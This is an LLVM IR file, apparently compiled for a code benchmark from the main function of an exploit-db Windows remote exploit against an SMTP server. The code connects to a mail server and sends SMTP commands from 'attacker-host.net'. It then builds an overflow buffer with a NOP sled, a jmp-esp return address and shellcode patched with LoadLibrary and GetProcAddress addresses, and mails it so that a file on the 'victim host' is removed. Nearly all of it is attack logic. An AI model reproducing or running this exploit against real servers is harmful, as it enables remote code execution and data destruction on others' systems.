; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19586.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19586.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.hostent = type { i32, i32, i32 }

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"This exploit removes \22%s\22 on the victim host\00", align 1
@TARGET_FILE = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [34 x i8] c"usage: %s SMTPserver Mailaddress\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"Winsock Initialization failed.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [24 x i8] c"Can not create socket.\0A\00", align 1
@SMTP_PORT = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [36 x i8] c"Can not connect to specified host.\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"BANNER    : %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"EHLO mail.attcker-host.net\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [42 x i8] c"MAIL FROM: <attacker@attacker-host.net>\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"RCPT TO: <%s>\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"DATA\0D\0A\00", align 1
@JMPESP_ADR = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i8* null, align 8
@cmdbuf = common dso_local global i8* null, align 8
@LoadLibrary = common dso_local global i64 0, align 8
@GetProcAddress = common dso_local global i64 0, align 8
@STACK_BYTES = common dso_local global i32 0, align 4
@CONTENT = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [4 x i8] c".\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"Done.\0A\00", align 1
@FALSE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_4__, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca %struct.hostent*, align 8
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @MAXBUF, align 4
  %19 = zext i32 %18 to i64
  %20 = call i8* @llvm.stacksave()
  store i8* %20, i8** %13, align 8
  %21 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %14, align 8
  %22 = load i32, i32* @MAXBUF, align 4
  %23 = add nsw i32 %22, 1000
  %24 = zext i32 %23 to i64
  %25 = alloca i8, i64 %24, align 16
  store i64 %24, i64* %15, align 8
  %26 = load i32, i32* %4, align 4
  %27 = icmp slt i32 %26, 3
  br i1 %27, label %28, label %35

28:                                               ; preds = %2
  %29 = load i8*, i8** @TARGET_FILE, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i8* %29)
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i8* %33)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

35:                                               ; preds = %2
  %36 = call i32 @MAKEWORD(i32 2, i32 0)
  store i32 %36, i32* %9, align 4
  %37 = load i32, i32* %9, align 4
  %38 = call i64 @WSAStartup(i32 %37, i32* %8)
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %42

40:                                               ; preds = %35
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

42:                                               ; preds = %35
  %43 = load i32, i32* @AF_INET, align 4
  %44 = load i32, i32* @SOCK_STREAM, align 4
  %45 = call i32 @socket(i32 %43, i32 %44, i32 0)
  store i32 %45, i32* %6, align 4
  %46 = load i32, i32* @INVALID_SOCKET, align 4
  %47 = icmp eq i32 %45, %46
  br i1 %47, label %48, label %50

48:                                               ; preds = %42
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

50:                                               ; preds = %42
  %51 = load i32, i32* @AF_INET, align 4
  %52 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 1
  store i32 %51, i32* %52, align 4
  %53 = load i64, i64* @SMTP_PORT, align 8
  %54 = trunc i64 %53 to i32
  %55 = call i32 @htons(i32 %54)
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 2
  store i32 %55, i32* %56, align 4
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @inet_addr(i8* %59)
  %61 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  %62 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = icmp eq i32 %60, -1
  br i1 %63, label %64, label %90

64:                                               ; preds = %50
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 1
  %67 = load i8*, i8** %66, align 8
  %68 = call %struct.hostent* @gethostbyname(i8* %67)
  store %struct.hostent* %68, %struct.hostent** %16, align 8
  %69 = icmp eq %struct.hostent* %68, null
  br i1 %69, label %70, label %72

70:                                               ; preds = %64
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

72:                                               ; preds = %64
  %73 = load %struct.hostent*, %struct.hostent** %16, align 8
  %74 = getelementptr inbounds %struct.hostent, %struct.hostent* %73, i32 0, i32 2
  %75 = load i32, i32* %74, align 4
  %76 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 1
  store i32 %75, i32* %76, align 4
  %77 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  %78 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %77, i32 0, i32 0
  %79 = bitcast i32* %78 to i8*
  %80 = load %struct.hostent*, %struct.hostent** %16, align 8
  %81 = getelementptr inbounds %struct.hostent, %struct.hostent* %80, i32 0, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = sext i32 %82 to i64
  %84 = inttoptr i64 %83 to i8*
  %85 = load %struct.hostent*, %struct.hostent** %16, align 8
  %86 = getelementptr inbounds %struct.hostent, %struct.hostent* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = trunc i32 %87 to i8
  %89 = call i32 @memcpy(i8* %79, i8* %84, i8 signext %88)
  br label %90

90:                                               ; preds = %72, %50
  %91 = load i32, i32* %6, align 4
  %92 = ptrtoint %struct.TYPE_4__* %7 to i32
  %93 = call i64 @connect(i32 %91, i32 %92, i32 12)
  %94 = load i64, i64* @SOCKET_ERROR, align 8
  %95 = icmp eq i64 %93, %94
  br i1 %95, label %96, label %98

96:                                               ; preds = %90
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

98:                                               ; preds = %90
  %99 = load i32, i32* %6, align 4
  %100 = load i32, i32* @MAXBUF, align 4
  %101 = call i32 @recv(i32 %99, i8* %25, i32 %100, i32 0)
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0), i8* %25)
  %103 = load i32, i32* %6, align 4
  %104 = call i32 @send_smtpcmd(i32 %103, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0))
  %105 = load i32, i32* %6, align 4
  %106 = call i32 @send_smtpcmd(i32 %105, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.8, i64 0, i64 0))
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 2
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @sprintf(i8* %25, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0), i8* %109)
  %111 = load i32, i32* %6, align 4
  %112 = call i32 @send_smtpcmd(i32 %111, i8* %25)
  %113 = load i32, i32* %6, align 4
  %114 = call i32 @send_smtpcmd(i32 %113, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0))
  %115 = load i32, i32* @MAXBUF, align 4
  %116 = call i32 @memset(i8* %21, i32 144, i32 %115)
  %117 = load i32, i32* @MAXBUF, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %21, i64 %118
  store i8 0, i8* %119, align 1
  %120 = load i32, i32* @JMPESP_ADR, align 4
  store i32 %120, i32* %10, align 4
  %121 = load i32, i32* %10, align 4
  %122 = and i32 %121, 255
  %123 = trunc i32 %122 to i8
  %124 = load i64, i64* @RETADR, align 8
  %125 = getelementptr inbounds i8, i8* %21, i64 %124
  store i8 %123, i8* %125, align 1
  %126 = load i32, i32* %10, align 4
  %127 = lshr i32 %126, 8
  %128 = and i32 %127, 255
  %129 = trunc i32 %128 to i8
  %130 = load i64, i64* @RETADR, align 8
  %131 = add i64 %130, 1
  %132 = getelementptr inbounds i8, i8* %21, i64 %131
  store i8 %129, i8* %132, align 1
  %133 = load i32, i32* %10, align 4
  %134 = lshr i32 %133, 16
  %135 = and i32 %134, 255
  %136 = trunc i32 %135 to i8
  %137 = load i64, i64* @RETADR, align 8
  %138 = add i64 %137, 2
  %139 = getelementptr inbounds i8, i8* %21, i64 %138
  store i8 %136, i8* %139, align 1
  %140 = load i32, i32* %10, align 4
  %141 = lshr i32 %140, 24
  %142 = and i32 %141, 255
  %143 = trunc i32 %142 to i8
  %144 = load i64, i64* @RETADR, align 8
  %145 = add i64 %144, 3
  %146 = getelementptr inbounds i8, i8* %21, i64 %145
  store i8 %143, i8* %146, align 1
  %147 = load i8*, i8** @exploit_code, align 8
  %148 = load i8*, i8** @cmdbuf, align 8
  %149 = call i32 @strcat(i8* %147, i8* %148)
  %150 = load i8*, i8** @exploit_code, align 8
  %151 = load i8*, i8** @TARGET_FILE, align 8
  %152 = call i32 @strcat(i8* %150, i8* %151)
  %153 = load i64, i64* @LoadLibrary, align 8
  %154 = trunc i64 %153 to i32
  store i32 %154, i32* %11, align 4
  %155 = load i64, i64* @GetProcAddress, align 8
  %156 = trunc i64 %155 to i32
  store i32 %156, i32* %12, align 4
  %157 = load i32, i32* %11, align 4
  %158 = and i32 %157, 255
  %159 = trunc i32 %158 to i8
  %160 = load i8*, i8** @exploit_code, align 8
  %161 = getelementptr inbounds i8, i8* %160, i64 13
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %11, align 4
  %163 = lshr i32 %162, 8
  %164 = and i32 %163, 255
  %165 = trunc i32 %164 to i8
  %166 = load i8*, i8** @exploit_code, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 14
  store i8 %165, i8* %167, align 1
  %168 = load i32, i32* %11, align 4
  %169 = lshr i32 %168, 16
  %170 = and i32 %169, 255
  %171 = trunc i32 %170 to i8
  %172 = load i8*, i8** @exploit_code, align 8
  %173 = getelementptr inbounds i8, i8* %172, i64 15
  store i8 %171, i8* %173, align 1
  %174 = load i32, i32* %11, align 4
  %175 = lshr i32 %174, 24
  %176 = and i32 %175, 255
  %177 = trunc i32 %176 to i8
  %178 = load i8*, i8** @exploit_code, align 8
  %179 = getelementptr inbounds i8, i8* %178, i64 16
  store i8 %177, i8* %179, align 1
  %180 = load i32, i32* %12, align 4
  %181 = and i32 %180, 255
  %182 = trunc i32 %181 to i8
  %183 = load i8*, i8** @exploit_code, align 8
  %184 = getelementptr inbounds i8, i8* %183, i64 30
  store i8 %182, i8* %184, align 1
  %185 = load i32, i32* %12, align 4
  %186 = lshr i32 %185, 8
  %187 = and i32 %186, 255
  %188 = trunc i32 %187 to i8
  %189 = load i8*, i8** @exploit_code, align 8
  %190 = getelementptr inbounds i8, i8* %189, i64 31
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %12, align 4
  %192 = lshr i32 %191, 16
  %193 = and i32 %192, 255
  %194 = trunc i32 %193 to i8
  %195 = load i8*, i8** @exploit_code, align 8
  %196 = getelementptr inbounds i8, i8* %195, i64 32
  store i8 %194, i8* %196, align 1
  %197 = load i32, i32* %12, align 4
  %198 = lshr i32 %197, 24
  %199 = and i32 %198, 255
  %200 = trunc i32 %199 to i8
  %201 = load i8*, i8** @exploit_code, align 8
  %202 = getelementptr inbounds i8, i8* %201, i64 33
  store i8 %200, i8* %202, align 1
  %203 = load i8*, i8** @TARGET_FILE, align 8
  %204 = call signext i8 @strlen(i8* %203)
  %205 = load i8*, i8** @exploit_code, align 8
  %206 = getelementptr inbounds i8, i8* %205, i64 42
  store i8 %204, i8* %206, align 1
  %207 = load i64, i64* @RETADR, align 8
  %208 = getelementptr inbounds i8, i8* %21, i64 %207
  %209 = getelementptr inbounds i8, i8* %208, i64 4
  %210 = load i32, i32* @STACK_BYTES, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  %213 = load i8*, i8** @exploit_code, align 8
  %214 = load i8*, i8** @exploit_code, align 8
  %215 = call signext i8 @strlen(i8* %214)
  %216 = call i32 @memcpy(i8* %212, i8* %213, i8 signext %215)
  %217 = load i8*, i8** @CONTENT, align 8
  %218 = call i32 @sprintf(i8* %25, i8* %217, i8* %21)
  %219 = load i32, i32* %6, align 4
  %220 = call signext i8 @strlen(i8* %25)
  %221 = call i32 @send(i32 %219, i8* %25, i8 signext %220, i32 0)
  %222 = load i32, i32* %6, align 4
  %223 = call i32 @send_smtpcmd(i32 %222, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %224 = load i32, i32* %6, align 4
  %225 = call i32 @closesocket(i32 %224)
  %226 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0))
  %227 = load i32, i32* @FALSE, align 4
  store i32 %227, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %228

228:                                              ; preds = %98, %96, %70, %48, %40, %28
  %229 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %229)
  %230 = load i32, i32* %3, align 4
  ret i32 %230
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i8 signext) #2

declare dso_local i64 @connect(i32, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @send_smtpcmd(i32, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local signext i8 @strlen(i8*) #2

declare dso_local i32 @send(i32, i8*, i8 signext, i32) #2

declare dso_local i32 @closesocket(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
